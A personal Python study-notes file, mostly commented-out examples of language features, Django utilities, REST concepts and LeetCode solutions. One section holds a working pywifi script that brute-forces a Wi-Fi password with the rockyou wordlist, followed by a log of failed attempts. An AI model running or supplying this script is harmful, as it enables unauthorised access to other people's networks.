'''he key difference between protected and private in Python lies in accessibility and intent. Here's a breakdown'''
'''Protected:'''
# class Parent:
#     def __init__(self):
#         self._protected_var = 42  # Protected variable

#     def _protected_method(self):
#         print("This is a protected method!")

# class Child(Parent):
#     def access_protected(self):
#         print(self._protected_var)  # Accessible in subclass
#         self._protected_method()   # Accessible in subclass

# obj = Child()
# obj.access_protected()
# print(obj._protected_var)  # Accessible but not recommended

'''private'''

# class Parent:
#     def __init__(self):
#         self.__private_var = 42  # Private variable

#     def __private_method(self):
#         print("This is a private method!")

#     def access_private(self):
#         print(self.__private_var)  # Accessible within the class
#         self.__private_method()

# obj = Parent()
# obj.access_private()
# # print(obj.__private_var)  # AttributeError: Cannot access private variable
# # obj.__private_method()    # AttributeError: Cannot access private method

# # Accessing through name mangling (not recommended):
# print(obj._Parent__private_var)  # Works but bypasses encapsulation



'''What is the difference between attrs and and args and kwargs'''


'''1.In Python, attrs, args, and kwargs are used to handle different types of arguments in functions or methods. Here's a breakdown of their differences:

1. attrs
attrs is typically a dictionary or a collection of key-value pairs that represent attributes or properties.

In your code, attrs is used to pass a dictionary-like object containing data, such as {'refresh_token': 'some_token_value'}.

It is not a standard Python term but is often used in frameworks (like Django REST Framework) to represent a collection of attributes or fields.'''
# def Test( attrs):
#     token = attrs['refresh_token']  # Accessing a key in the dictionary
#     return attrs


# dif = {
#         'refresh_token':'aaaaaaaaaaaaaaaaaaa',
#         'key' :'valueeeeeeeeee'
# }

# obj = Test(dif)
# a = obj['refresh_token']
# print(a)


# class Myclass:

#         def Test(self,attrs):
#                 self.token = attrs['token']
#                 return attrs


# dif = {
#         'token':'aaaaaaaaaaaaaaaaaaa',
#         'key' :'valueeeeeeeeee'
# }
# obj = Myclass()

# a = obj.Test(dif)
# print(a['token'])

'''
2. *args
*args is used to pass a variable number of positional arguments to a function.

It collects all positional arguments into a tuple.

It is useful when you don't know how many arguments will be passed to the function.'''

# class Token:
#         def Check(self,*args):
#                 res = sum(args)

#                 return res

# obj = Token()
# print(obj.Check(1,2,3))
# print(obj.Check(10,20,30))


'''fun'''
# def exam_result(*args):
#         print('results',args)
#         for a in args:
#                 print(a)

# exam_result(1,2,'apple','hello')


'''output'''
# 1
# 2
# apple
# hello


'''fun'''
# def exam_result(*args):
#         print('results',args[2])
#         for a in args:
#                 pass

# exam_result(1,2,'apple','hello')

'''output'''
        # apple

'''3. **kwargs
**kwargs is used to pass a variable number of keyword arguments (key-value pairs) to a function.

It collects all keyword arguments into a dictionary.

It is useful when you want to handle named arguments dynamically.'''

'''fun'''

# def Abc(**kwargs):

#         for key,value in kwargs.items():
#                 print(f"{key}:{value}")


# Abc(name='alice',age=25)  

'''output
name:alice
age:25'''


'''class'''

# class Abu:
#         def Test(self,**kwargs):
#                 for key,val in kwargs.items():
#                         print(f"{key}:{val}")

# obj = Abu()
# a = obj.Test(
#         amima='helllooo',
#         age = 25,
#         status = 'married'
# )



''' output :
amima:helllooo
age:25
status:married
'''

#  short note about 3 of them

'''
Key Differences:
Feature	        attrs	                                *args	                                        **kwargs
Type	        Dictionary (or similar)	                Tuple	                                         Dictionary
Purpose	        Holds attributes or fields	        Collects positional arguments	                Collects keyword arguments
Usage	        Specific to frameworks or logic	        General-purpose for any function	        General-purpose for any function
Example	        attrs['refresh_token']	                args[0] (first positional arg)	                kwargs['name'](key-value pair)
'''

# Example Combining All Three:

# def example( attrs, *args, **kwargs):
#     print("Attributes:", attrs)

#     access_token = attrs['acces_tokens']
#     print(access_token, 'access_token')

#     # Uncomment this if you want to access refresh_token
#     refresh_token = attrs['refresh_tokens']
#     print(refresh_token, 'refresh_token')

#     print("Positional arguments:", args)
    
#     for i in args:
#         print(i,'argss')

#     print("Keyword arguments:", kwargs)

#     for key,val in kwargs.items():
#         print(f"{key},{val}","kwargs")



# example(
#     {'refresh_tokens': 'abc123','acces_tokens':'xyz987'},  # attrs
#     1, 2, 3,                      # *args
#     name='Alice', age=25          # **kwargs
# )

'''my output'''

# Attributes: {'refresh_tokens': 'abc123', 'acces_tokens': 'xyz987'}
# xyz987 access_token
# abc123 refresh_token

# Positional arguments: (1, 2, 3)
# 1 argss
# 2 argss
# 3 argss

# Keyword arguments: {'name': 'Alice', 'age': 25}
# name,Alice kwargs
# age,25 kwargs


'In summary:'

# attrs is a dictionary of attributes.

# *args is for variable positional arguments.

# **kwargs is for variable keyword arguments.


'''Any'''


# from typing import Any

# def process_data(data):
#     # Here, `data` can be of any type: int, str, list, dict, etc.
#     print(data)

# # These are all valid calls to the function:
# process_data(42)          # int
# process_data("hello")     # str
# process_data([1, 2, 3])   # list
# process_data({"key": "value"})  # dict

'''Key Points:
Flexibility: Any allows you to bypass type checking for a specific variable.

Use with Caution: Overusing Any can defeat the purpose of type checking, making your code less safe and harder to understand. It's generally better to use more specific types whenever possible.

Compatibility: Any is compatible with all other types, so you can assign a value of type Any to a variable of any other type, and vice versa.

When to Use Any:
When interacting with dynamic or untyped code (e.g., data from external APIs).

When the type of a variable is truly unknown or can vary widely.

When migrating a codebase to use type hints and you need a temporary escape hatch.'''

# Differnce b/w traditional api vs rest api

'''Summary Table:

Feature	        REST API	                        Traditional API (SOAP/RPC)
Architecture	Resource-based, stateless	        Action-based, operation-based
Data Format	JSON (preferred), XML	                XML (SOAP), custom formats (RPC)
Protocol	HTTP/HTTPS	                        HTTP, SMTP, TCP, etc.
Performance	Lightweight, faster	                Heavier, slower
Error Handling	HTTP status codes, JSON messages	Built-in fault messages (SOAP)
Security	HTTPS, OAuth, API keys	                WS-Security (SOAP), custom (RPC)
Use Cases	Web, mobile, microservices	        Enterprise, financial systems'''




# The terms REST API and Traditional API (often referring to SOAP or RPC-based APIs) refer to different architectural styles and approaches for building and consuming APIs. Here's a breakdown of the key differences:

'''1. Architecture and Design
REST API (Representational State Transfer):

REST is an architectural style that uses HTTP protocols and standard methods like GET, POST, PUT, DELETE, etc.

It is resource-based, meaning APIs are designed around resources (e.g., users, products) and their representations (e.g., JSON, XML).

REST APIs are stateless, meaning each request from the client to the server must contain all the information needed to understand and process the request.

Traditional API (e.g., SOAP or RPC):

Traditional APIs like SOAP (Simple Object Access Protocol) or RPC (Remote Procedure Call) are action-based or operation-based.

SOAP APIs use XML for messaging and rely on a strict protocol with built-in error handling and security features.

RPC APIs focus on invoking specific functions or procedures on a remote server, often using custom protocols or HTTP.

2. Data Format
REST API:

Typically uses lightweight data formats like JSON (most common) or XML.

JSON is easier to read and parse, making REST APIs more developer-friendly.

Traditional API:

SOAP APIs use XML exclusively, which is more verbose and complex compared to JSON.

RPC APIs may use custom data formats or protocols, depending on the implementation.

3. Communication Protocol
REST API:

Relies on HTTP/HTTPS and uses standard HTTP methods (GET, POST, PUT, DELETE) for communication.

Works well with web technologies and is widely supported.

Traditional API:

SOAP APIs can work over various protocols, including HTTP, SMTP, TCP, etc.

RPC APIs may use custom protocols or HTTP, but they are less standardized compared to REST.

4. Performance and Scalability
REST API:

Lightweight and faster due to the use of JSON and statelessness.

Easier to scale horizontally because each request is independent.

Traditional API:

SOAP APIs are heavier due to XML and additional overhead (e.g., WS-Security, WS-Addressing).

RPC APIs may have performance bottlenecks depending on the implementation.

5. Error Handling
REST API:

Uses standard HTTP status codes (e.g., 200 for success, 404 for not found, 500 for server errors).

Error messages are often returned in JSON format.

Traditional API:

SOAP APIs have built-in error handling with detailed fault messages in XML.

RPC APIs may have custom error-handling mechanisms.

6. Security
REST API:

Relies on standard web security practices like HTTPS, OAuth, and API keys.

No built-in security features, so developers must implement security measures.

Traditional API:

SOAP APIs have built-in security features like WS-Security for encryption, authentication, and integrity.

RPC APIs may require custom security implementations.

7. Use Cases
REST API:

Ideal for modern web and mobile applications, microservices, and public APIs.

Commonly used for CRUD (Create, Read, Update, Delete) operations.

Traditional API:

SOAP is often used in enterprise environments, financial services, and systems requiring high security and reliability.

RPC is used in scenarios where specific remote procedures need to be invoked.
'''




'''swagger'''
# Swagger is a tool used for designing, building, documenting, and consuming RESTful web services. It provides a standardized way to describe RESTful APIs, making it easier for developers to understand and interact with them. Here are some key uses of Swagger:

# API Documentation: Swagger generates interactive and human-readable API documentation automatically from the API definition. This documentation includes details about endpoints, request/response formats, parameters, and examples.

# API Design: Swagger allows developers to design APIs using the OpenAPI Specification (formerly known as Swagger Specification). This specification is a standard, language-agnostic way to describe RESTful APIs, making it easier to collaborate and share API designs.

# Code Generation: Swagger can generate server stubs, client SDKs, and API documentation in various programming languages based on the API definition. This speeds up development and ensures consistency between the API and its implementation.

# Testing: Swagger provides tools like Swagger UI and Swagger Editor, which allow developers to interact with and test APIs directly from the documentation. This helps in validating the API's behavior during development.

# Standardization: By using Swagger, teams can ensure that their APIs follow a consistent structure and adhere to best practices. This improves maintainability and reduces the learning curve for new developers.

# Collaboration: Swagger's clear and standardized API descriptions make it easier for teams to collaborate on API development, whether they are working on the backend, frontend, or third-party integrations.


'''
render_to_string function

the render_to_string function is commonly used in web development frameworks, particularly in Django, a popular Python web framework. Its primary purpose is to render a template to a string, rather than directly returning an HTTP response'''

# from django.template.loader import render_to_string

# context = {'name': 'John Doe'}
# html_string = render_to_string('my_template.html', context)

'''strip_tags'''

'''The strip_tags function is commonly used in web development to remove HTML and XML tags from a string. It is particularly useful for sanitizing user input or cleaning up content to ensure that no unwanted or potentially harmful HTML/XML tags are present.
'''

# from django.utils.html import strip_tags

# html_content = "<p>Hello, <b>world!</b></p>"
# plain_text = strip_tags(html_content)

# print(plain_text)  # Output: "Hello, world!"

# Thread 
'''What is a Thread?
A thread is the smallest unit of execution in a program. 
It represents a sequence of instructions that can be executed independently. 
By using multiple threads, you can perform multiple tasks at the same time within the same program.'''

'''The threading module in Python provides a way to create and manage threads, which are separate flows of execution within a program. 
Threads allow you to run multiple tasks concurrently, 
making it possible to perform operations in parallel and improve the efficiency of your program, especially for I/O-bound or concurrent tasks.'''



'''lc 1'''
# target = 10
# arr = [1,2,4,5,6,7]
# class Solution:
#         def findTarget(self,arr,target):
#                 for i in range(len(arr)):
#                         for j in range(i+1,len(arr)):
#                                 if arr[i]+arr[j] == target:
#                                         return i,j

# obj = Solution()
# a = obj.findTarget(arr,target)
# print(a)

'''simplified method'''


'''enumerate

In Python, enumerate() is a built-in function that allows you to loop over an iterable (like a list, tuple, or string) 
while keeping track of the index of the current item. It returns a sequence of tuples, 
where each tuple contains the index and the corresponding item from the iterable.'''

'''syntax'''

# enumerate(iterable, start=0)

'''sample'''
# arr = [1,2,3,4,5]

# for index,value in enumerate(arr):
#         print(f'index,{index}value:{value}')


'''using enumerate'''

# target = 10
# arr = [1,2,4,5,6,7]

# class solution:
#         def findTarget(self,arr,target):
#                 seen = {}

#                 for i,num in enumerate(arr):
#                         complement = target-num
#                         print(complement)
#                         if complement in seen:
#                                 return seen[complement] # Return the indices
#                         seen[num]=i   # Store the current number and its index in the dictionary

# obj = solution()
# a = obj.findTarget(arr,target)
# print(a)


# print(10-7,'checkkkkkkk')



# target = 10
# arr = [1, 2, 4,8, 5,7]

# class solution:
#     def findTarget(self, target, arr):  # Fix parameter names
#         seen = {}
#         for i, num in enumerate(arr):
#             complement = target - num
#             print(complement,'complement')
#             if complement in seen:
#                 print(seen,'seen')
#                 return seen[complement], i  # Return the indices
#             seen[num] = i  # Store the current number and its index in the dictionary

# obj = solution()
# a = obj.findTarget(target, arr)  # Corrected order
# print(a,'outpu') #1,3 index 
'''because :  when 10-8=2 and it takes the index of current value (3) and the number that exist ie, output is 2 but 2 already exist there at index (1)'''

''''''
# from .tasks import process_evaluation
'''is used to import the process_evaluation function (or task) from the tasks.py file in the same directory (indicated by the .).
'''
'''Breakdown:
from .tasks:
The . refers to the current directory (or module) where this import is being executed. It tells Python to look in the current directory for a file named tasks.py.
import process_evaluation:
This imports the process_evaluation function (or task) from the tasks.py file. This is typically used to reference a Celery task or any other function defined in that file.
Use Case in Django + Celery:
In the context of Celery and Django, tasks.py is commonly used to define asynchronous tasks. These tasks can be executed in the background (off the main thread) to avoid blocking the main application flow, for example, long-running processes like processing evaluations.

Here's how it might look:

Example of tasks.py:'''

# # tasks.py
# from celery import shared_task

# @shared_task
# def process_evaluation(evaluation_id):
#     # Logic to process the evaluation based on the evaluation_id
#     print(f"Processing evaluation with ID: {evaluation_id}")
'''In the example above, process_evaluation is a Celery task defined using the @shared_task decorator. This task will run in the background when called.'''

'''Using the Task in Views or Other Files:
Now, when you write from .tasks import process_evaluation in a view or another file, you're bringing this Celery task into that file so that you can call it. For example:
'''
# views.py
# from .tasks import process_evaluation

# def submit_evaluation(request):
#     evaluation_id = request.data.get("evaluation_id")
    
    # Call the Celery task to process the evaluation in the background
#     process_evaluation.delay(evaluation_id)
    
#     return Response({"message": "Evaluation is being processed!"})
# process_evaluation.delay(evaluation_id): #This line enqueues the task process_evaluation to be executed asynchronously by a Celery worker. The delay() method is used to send the task to the Celery queue for background processing.
'''In Summary:
from .tasks import process_evaluation imports the process_evaluation task or function defined in tasks.py.
It is commonly used to call the function or Celery task from elsewhere in your Django application (like views or signals).
Celery tasks are typically used for background processing (e.g., running long processes asynchronously).
Let me know if you'd like more information on how to configure Celery or tasks in Django!'''


'''Resend '''

# import os
# import resend

# resend.api_key = os.environ["RESEND_API_KEY"]

# params: resend.Emails.SendParams = {
#     "from": "Acme <onboarding@resend.dev>",
#     "to": ["delivered@resend.dev"],
#     "subject": "hello world",
#     "html": "<strong>it works!</strong>",
# }

# email = resend.Emails.send(params)
# print(email)

'''staash'''
# git stash 

# git stash list

# git stash pop stash@{0}



'''. and # in css '''

'''
1 # (Hash/Pound Symbol):

Targets an ID in HTML.

IDs are unique; only one element in a document should have a specific ID.

Example: <div id="backgroundcolor"></div> is targeted in CSS as #backgroundcolor.

2. (Dot Symbol):

Targets a class in HTML.

Classes are reusable; multiple elements can share the same class.

Example: <div class="error-message"></div> is targeted in CSS as .error-message.

Key Differences:

Feature	        # (ID)	                             . (Class)
Uniqueness	Unique (one per page)	                Reusable (multiple elements)
Specificity	Higher specificity	                Lower specificity
Use Case	Targeting a single unique element	Styling multiple similar elements
Performance	Slightly faster (browser lookup)	Slightly slower (if overused)


Which is Better?

It depends on your use case:

Use # (ID) when:

You are targeting a single, unique element (e.g., a specific container, header, or footer).

Example: <body id="backgroundcolor"> or <div id="main-content">.

Use . (Class) when:

You want to apply the same style to multiple elements.

Example: <p class="error-message">Error 1</p> and <p class="error-message">Error 2</p>.'''

# <style>
#     /* ID Selector */
#     #backgroundcolor {
#         background-color: yellow;
#     }

#     /* Class Selector */
#     .error-message {
#         color: red;
#         font-size: 0.9em;
#         margin-top: 5px;
#     }
# </style>

# <body id="backgroundcolor"> <!-- ID used for unique styling -->
#     <p class="error-message">This is an error message.</p> <!-- Class used for reusable styling -->
#     <p class="error-message">Another error message.</p>
# </body>

'''Best Practices:
Use IDs sparingly: Reserve them for unique elements. Overusing IDs can make your CSS harder to maintain.

Use classes for reusable styles: Classes are more flexible and promote consistency across your design.

Avoid over-specificity: Using too many IDs can lead to overly specific CSS, making it harder to override styles later.

In most cases, classes (.) are preferred because they are more flexible and reusable. Use IDs (#) only when you need to target a single, unique element.'''


'''wifi password'''

# import time
# import pywifi
# from pywifi import const, Profile

# def connect_to_wifi(ssid, password):
#     wifi = pywifi.PyWiFi()
#     iface = wifi.interfaces()[0]  # Select the first Wi-Fi interface

#     iface.disconnect()
#     time.sleep(1)  # Wait a bit before trying to connect

#     profile = Profile()
#     profile.ssid = ssid  # Set the network name
#     profile.auth = const.AUTH_ALG_OPEN  # Open authentication
#     profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WPA2 security type
#     profile.cipher = const.CIPHER_TYPE_CCMP  # Encryption type
#     profile.key = password.strip()  # Set the password

#     iface.remove_all_network_profiles()  # Remove existing profiles
#     new_profile = iface.add_network_profile(profile)  # Add new profile

#     iface.connect(new_profile)  # Try connecting
#     time.sleep(5)  # Wait for connection

#     if iface.status() == const.IFACE_CONNECTED:
#         print(f"\n[+] Successfully connected to {ssid} with password: {password}")
#         return True
#     else:
#         print(f"[-] Failed: {password}")
#         return False

# def brute_force_wifi(ssid, wordlist_path):
#     with open(wordlist_path, "r", encoding="latin-1") as file:  # Open wordlist
#         for password in file:
#             password = password.strip()  # Remove newline characters
#             if connect_to_wifi(ssid, password):
#                 break  # Stop if password is correct

# # Example usage
# ssid = "Study"
# wordlist_path = "C:/Users/user/Downloads/rockyou.txt"
 

# brute_force_wifi(ssid, wordlist_path)



'''lenght of checked password'''


# Assuming the log is stored in a string called `log_text`
# log_text = """
# [-] Failed: 01234
# pywifi 2025-02-16 20:32:10,977 ERROR Open handle failed!
# [-] Failed: rosales
# pywifi 2025-02-16 21:54:26,230 ERROR Open handle failed!
# [-] Failed: narnia
# pywifi 2025-02-16 21:54:32,258 ERROR Open handle failed!
# [-] Failed: monkey3
# pywifi 2025-02-16 21:54:38,281 ERROR Open handle failed!
# [-] Failed: mileycyrus
# pywifi 2025-02-16 21:54:44,371 ERROR Open handle failed!
# [-] Failed: maxmax
# pywifi 2025-02-16 21:54:50,450 ERROR Open handle failed!
# [-] Failed: journey

# """  # Replace this with your actual log

# Count the number of "Failed:" occurrences
# password_attempts = log_text.count("[-] Failed:")

# print(f"Total password attempts: {password_attempts}")


# '''1.checked password# 514'''


'''escape'''

'''The escape() function from django.utils.html is used to escape special HTML characters in a string, preventing HTML injection and XSS (Cross-Site Scripting) attacks.

Use Case
When rendering user-generated content, you might need to escape characters like <, >, &, and " so they don’t get interpreted as HTML.

Example'''

# from django.utils.html import escape

# user_input = "<script>alert('hacked')</script>"
# escape_out_put = escape(user_input)
# print(escape_out_put)

# Original: <script>alert("Hacked!");</script>
# Escaped: &lt;script&gt;alert(&quot;Hacked!&quot;);&lt;/script&gt;


'''signers'''


'''The Signer class from django.core.signing is not meant for encryption and decryption. Instead, it provides a way to sign and verify data to ensure its integrity. It prevents tampering but does not encrypt the data.

How It Works
signer.sign(data): Appends a cryptographic signature to the data.
signer.unsign(data): Verifies the signature and extracts the original data.
This ensures that the data has not been modified but does not hide the content.

'''


# from django.core.signing import Signer

# signer = Signer()


# class URLEncryptionDecryption():
    
#     def enc(data : any):
#         return signer.sign(data)
    

#     def dec(data : any):
#         try:
#             return signer.unsign(data)
#         except Exception as e:
#             return None

# # Example Usage
# data = "user123"

# singed_data = URLEncryptionDecryption.enc(data)
# print(singed_data,'dataaaaaaaaaaaa')

# original_data = URLEncryptionDecryption.dec(singed_data)
# print(original_data,'original_dataaaaaaaaaaaa')

# tampered_data = singed_data.replace('user123','hacker123')
# print("Tampered data",URLEncryptionDecryption.dec(tampered_data))



# Signed Data: user123:9Jw0lN3E7FvDuoHMO7YgMKfCFSo
# Original Data: user123
# Tampered Data: None  # Signature verification fails

# def func(x, y=[]):
#     y.append(x)
#     return y

# print(func(1))
# print(func(2, []))
# print(func(3))


# # obj= func(2, [])


# # Message pretending to be emoji (typed as text)
# fake_emoji = "ud83dude02ud83dude02"

# # Actual emojis
# real_emoji = "😂😂"

# print("Fake looks like:", fake_emoji)
# print("Real looks like:", real_emoji)

# # Check if string contains actual emoji
# import emoji

# def contains_emoji(s):
#     return any(char in emoji.EMOJI_DATA for char in s)

# print("Fake has emoji?", contains_emoji(fake_emoji))  # False
# print("Real has emoji?", contains_emoji(real_emoji))  # True

#  mysql to psql convertor//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


# import re

# input_file = r'C:\Users\user\Downloads\db_pearl_m.sql'
# output_file = 'postgres_clean_insert.sql'

# def fix_quotes(value):
#     if value.startswith("'") and value.endswith("'"):
#         inner = value[1:-1]
#         inner = inner.replace("'", "''")  # Double any single quotes
#         return f"'{inner}'"
#     return value

# def main():
#     with open(input_file, 'r', encoding='utf-8') as f:
#         sql_text = f.read()

#     # Regex to match INSERT INTO db_pearl_m (...) VALUES (...);
#     pattern = re.compile(
#         r"INSERT\s+INTO\s+[`\"]?db_pearl_m[`\"]?\s*\((.*?)\)\s*VALUES\s*((?:\([^)]+\)\s*,?\s*)+);",
#         re.IGNORECASE | re.DOTALL,
#     )

#     matches = pattern.findall(sql_text)

#     if not matches:
#         print("No INSERT statements found.")
#         return

#     with open(output_file, 'w', encoding='utf-8') as outf:
#         for cols, values_block in matches:
#             cols_clean = re.sub(r"[`\"]", "", cols).strip()

#             # Safely split multiple value tuples
#             tuples = []
#             buf = ''
#             depth = 0
#             for char in values_block:
#                 if char == '(':
#                     depth += 1
#                 if char == ')':
#                     depth -= 1
#                 buf += char
#                 if depth == 0 and buf.strip():
#                     tuples.append(buf.strip())
#                     buf = ''

#             fixed_tuples = []
#             for tup in tuples:
#                 def repl(m):
#                     val = m.group(0)
#                     val = val.replace("\\'", "''")  # Convert \' to ''
#                     return fix_quotes(val)

#                 # Replace all single-quoted strings with fixed versions
#                 fixed_tup = re.sub(r"'([^']|\\')*?'", repl, tup)
#                 fixed_tuples.append(fixed_tup)

#             all_values = ',\n'.join(fixed_tuples)
#             insert_stmt = f"INSERT INTO db_pearl_m ({cols_clean}) VALUES\n{all_values};\n\n"
#             outf.write(insert_stmt)

#     print(f"✅ Done: {len(matches)} INSERT statements converted and saved to '{output_file}'")

# if __name__ == "__main__":
#     main()



#  lc 121

# class Solution:
#     def maxProfit(self, prices):
#         buyPrice = prices[0]
#         profit = 0

#         for price in prices:
#             if buyPrice > price:
#                 buyPrice = price
#             profit = max(profit, price - buyPrice)
#         return profit

# obj = Solution()
# prices = [7,1,5,3,6,4]
# a= obj.maxProfit(prices)
# print(a)


# lc 75

'''Given an array nums with n objects colored red, white, or blue, sort them in-place so that objects of the same color are adjacent, with the colors in the order red, white, and blue.

We will use the integers 0, 1, and 2 to represent the color red, white, and blue, respectively.

You must solve this problem without using the library's sort function.'''

# Input: nums = [2,0,2,1,1,0]
# Output: [0,0,1,1,2,2]

# class Solution:
#     def sortColors(self, nums):
#         count =[0,0,0]
#         for i in nums:
#             count[i] += 1

#         index = 0
#         for i in range(3):
#             for j in range(count[i]):
#                 nums[index] = i
#                 index += 1 
#         return nums
                

#         """
#         Do not return anything, modify nums in-place instead.
#         """

# obj = Solution()
# nums = [2,0,2,1,1,0]
# a = obj.sortColors(nums)
# print(a)
        

# lc 58

'''Given a string s consisting of words and spaces, return the length of the last word in the string.

A word is a maximal substring consisting of non-space characters only.

 
Example 1:

Input: s = "Hello World"
Output: 5
Explanation: The last word is "World" with length 5.'''


# class Solution:
#     def lengthOfLastWord(self, s: str) -> int:

#         words = s.split()
#         len_last_word = len(words[-1])
#         print(len_last_word)


#         return len_last_word
    

# obj = Solution()
# s = "   fly me   to   the moon  "
# # s = "luffy is still joyboy"
# # s = "Hello World"
# a = obj.lengthOfLastWord(s)
# print(a)


# lc 238 or 3136. Valid Word

'''A word is considered valid if:

It contains a minimum of 3 characters.
It contains only digits (0-9), and English letters (uppercase and lowercase).
It includes at least one vowel.
It includes at least one consonant.
You are given a string word.

Return true if word is valid, otherwise, return false.

Notes:

'a', 'e', 'i', 'o', 'u', and their uppercases are vowels.
A consonant is an English letter that is not a vowel.'''
 

# Example 1:

# Input: word = "234Adas"

# Output: true

# Explanation:

# This word satisfies the conditions.

# Example 2:

# Input: word = "b3"

# Output: false

# Explanation:

# The length of this word is fewer than 3, and does not have a vowel.

# Example 3:

# Input: word = "a3$e"

# Output: false

# Explanation:

# This word contains a '$' character and does not have a consonant.


# class CorretWord:
#         def FindCorrectWord(self,word):

#                 if len(word) < 3:
#                         return False
                
#                 c=0
#                 v=0
#                 vowel_set = "aeiouAEIOU"

#                 for i in word:
#                         if i.isalpha():
#                                 if i in vowel_set:
                                
#                                         v += 1
#                                 else:
#                                         c += 1
                                
#                         elif not i.isdigit():
#                                 return False
                        
#                 return v >=1 and c >=1

# obj = CorretWord()
# # word = "234Adas"
# # word = "a3$e"
# # word = "b3"
# word = "bbbbbbb"

# a = obj.FindCorrectWord(word)
# print(a)


# lc 27. Remove Element


'''Given an integer array nums and an integer val, remove all occurrences of val in nums in-place. The order of the elements may be changed. Then return the number of elements in nums which are not equal to val.

Consider the number of elements in nums which are not equal to val be k, to get accepted, you need to do the following things:

Change the array nums such that the first k elements of nums contain the elements which are not equal to val. The remaining elements of nums are not important as well as the size of nums.
Return k.
Custom Judge:

The judge will test your solution with the following code:

int[] nums = [...]; // Input array
int val = ...; // Value to remove
int[] expectedNums = [...]; // The expected answer with correct length.
                            // It is sorted with no values equaling val.

int k = removeElement(nums, val); // Calls your implementation

assert k == expectedNums.length;
sort(nums, 0, k); // Sort the first k elements of nums
for (int i = 0; i < actualLength; i++) {
    assert nums[i] == expectedNums[i];
}
If all assertions pass, then your solution will be accepted.'''

 

# Example 1:

# Input: nums = [3,2,2,3], val = 3
# Output: 2, nums = [2,2,_,_]
# Explanation: Your function should return k = 2, with the first two elements of nums being 2.
# It does not matter what you leave beyond the returned k (hence they are underscores).
# Example 2:

# Input: nums = [0,1,2,2,3,0,4,2], val = 2
# Output: 5, nums = [0,1,4,0,3,_,_,_]
# Explanation: Your function should return k = 5, with the first five elements of nums containing 0, 0, 1, 3, and 4.
# Note that the five elements can be returned in any order.
# It does not matter what you leave beyond the returned k (hence they are underscores).
 


# class Solution:
#     def removeElement(self, nums,val) -> int:
#         k = 0
#         for i in range(len(nums)):
#             if nums[i] != val:
#                 nums[k] = nums[i]
#                 k += 1
        
#         return k


# obj = Solution()
# nums = [3,2,2,3]
# val = 3
# a = obj.removeElement(nums,val)
# print(a)



# sort and find unique of a list


# lis = [ 1, 4, 2, 4, 3, 7, 1 ]
# uni = []

# find unique numbers

# for i in lis:
#     if i not in uni:
#         uni.append(i)

# print(f'{uni},unique numbers only')

# # sorting unique number

# for i in range(len(uni)):
#     for j in range(len(uni)-i-1):
#         if uni[j] > uni[j+1]:
#             uni[j],uni[j+1] = uni[j+1],uni[j]

# print(f'{uni},sorted unique number')


# lc 1394

'''1394. Find Lucky Integer in an Array
Easy
Topics
premium lock icon
Companies
Hint
Given an array of integers arr, a lucky integer is an integer that has a frequency in the array equal to its value.

Return the largest lucky integer in the array. If there is no lucky integer return -1.'''

 

# Example 1:

# Input: arr = [2,2,3,4]
# Output: 2
# Explanation: The only lucky number in the array is 2 because frequency[2] == 2.
# Example 2:

# Input: arr = [1,2,2,3,3,3]
# Output: 3
# Explanation: 1, 2 and 3 are all lucky numbers, return the largest of them.
# Example 3:

# Input: arr = [2,2,2,3,3]
# Output: -1
# Explanation: There are no lucky numbers in the array.
 

'''Constraints:

1 <= arr.length <= 500
1 <= arr[i] <= 500
'''


# class Solution:
#     def findLucky(self, arr):

#         count = {}
#         lucky = -1
#         for i in arr:
#             count[i] = count.get(i,0) +1
        
#         for key,val in count.items():
#             if key == val:
#                 if key > lucky:
#                     lucky = key
#         return lucky

# obj = Solution()
# # arr = [2,2,3,4]
# arr = [1,2,2,3,3,3]
# a = obj.findLucky(arr)
# print(a)


# lc 283

'''283. Move Zeroes
Easy
Topics
premium lock icon
Companies
Hint
Given an integer array nums, move all 0's to the end of it while maintaining the relative order of the non-zero elements.

Note that you must do this in-place without making a copy of the array.
'''
# Example 1:

# Input: nums = [0,1,0,3,12]
# Output: [1,3,12,0,0]
# Example 2:

# Input: nums = [0]
# Output: [0]
 

'''Constraints:

1 <= nums.length <= 104
-231 <= nums[i] <= 231 - 1
 '''

# class Solution:
#     def moveZeroes(self, nums) -> None:
#         """
#         Do not return anything, modify nums in-place instead.
#         """
#         left = 0

#         for right in range(len(nums)):
#             if nums[right] != 0:
#                 nums[right],nums[left] = nums[left],nums[right]
#                 left += 1

#         return(nums)

# obj = Solution()
# # nums = [0,0,1]
# nums = [0,1,0,3,12]
# a = obj.moveZeroes(nums)
# print(a)


# lc 1 


'''Input: nums = [2,7,11,15], target = 9
Output: [0,1]
Explanation: Because nums[0] + nums[1] == 9, we return [0, 1].
        '''
# class Solution:
#     def twoSum(self,num,tar):
#         for i in range(len(num)):
#             for j in range(i+1,len(num)):
#                 if num[i]+num[j] == tar:
#                     return i,j

# obj = Solution()
# num = [2,7,11,15]
# tar = 9
# q=obj.twoSum(num,tar)
# print(q)


# for i in range(5,5):
#     print(i)

#    """ op : nothing"""



# s = "Python"
# print(s[-1:1:-1])
# # op = noht


# lc 976

'''Given an integer array nums, return the largest perimeter of a triangle with a non-zero area, formed from three of these lengths. If it is impossible to form any triangle of a non-zero area, return 0.

Example 1:

Input: nums = [2,1,2]
Output: 5
Explanation: You can form a triangle with three side lengths: 1, 2, and 2.
Example 2:

Input: nums = [1,2,1,10]
Output: 0
Explanation: 
You cannot use the side lengths 1, 1, and 2 to form a triangle.
You cannot use the side lengths 1, 1, and 10 to form a triangle.
You cannot use the side lengths 1, 2, and 10 to form a triangle.
As we cannot use any three side lengths to form a triangle of non-zero area, we return 0.'''

# class Solution:
#     def largestPerimeter(self, nums):
#         nums.sort(reverse=True)
#         for i in range(len(nums)-2):
#             if nums[i] < nums[i+1] + nums[i+2]:
#                 return nums[i]+nums[i+1]+nums[i+2]
#         return 0
        
        
# obj = Solution()
# # nums = [1,2,1,10]
# nums = [2,1,2]
# obj1 = obj.largestPerimeter(nums)
# print(obj1)



# lc 1039

'''1039. Minimum Score Triangulation of Polygon
Medium
Topics
premium lock icon
Companies
Hint
You have a convex n-sided polygon where each vertex has an integer value. You are given an integer array values where values[i] is the value of the ith vertex in clockwise order.
Polygon triangulation is a process where you divide a polygon into a set of triangles and the vertices of each triangle must also be vertices of the original polygon. Note that no other shapes other than triangles are allowed in the division. This process will result in n - 2 triangles.
You will triangulate the polygon. For each triangle, the weight of that triangle is the product of the values at its vertices. The total score of the triangulation is the sum of these weights over all n - 2 triangles.
Return the minimum possible score that you can achieve with some triangulation of the polygon.


Example 1:
Input: values = [1,2,3]
Output: 6
